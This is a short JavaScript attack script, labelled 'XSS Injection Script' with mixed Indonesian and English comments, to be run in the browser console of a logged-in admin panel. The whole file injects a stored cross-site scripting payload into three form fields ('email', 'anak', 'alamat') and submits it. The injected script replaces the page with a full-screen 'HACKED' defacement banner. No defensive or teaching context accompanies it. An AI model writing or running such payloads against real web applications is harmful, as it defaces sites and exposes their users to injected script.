
// XSS Injection Script
// Run this in browser console saat sudah login ke admin panel

function injectPayload() {
    // Fill form dengan payload
    document.getElementById('email').value = `<script>
localStorage.setItem("hacked", "true");
if(localStorage.getItem("hacked")){
    document.body.innerHTML = '<div style="background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;font-size:50px">HACKED</div>';
}
</script>`;
    document.getElementById('anak').value = `<script>
localStorage.setItem("hacked", "true");
if(localStorage.getItem("hacked")){
    document.body.innerHTML = '<div style="background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;font-size:50px">HACKED</div>';
}
</script>`;
    document.getElementById('alamat').value = `<script>
localStorage.setItem("hacked", "true");
if(localStorage.getItem("hacked")){
    document.body.innerHTML = '<div style="background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;font-size:50px">HACKED</div>';
}
</script>`;
    
    // Submit form
    document.getElementById('myForm').submit();
    
    console.log('[+] Payload injected!');
}

// Execute
injectPayload();
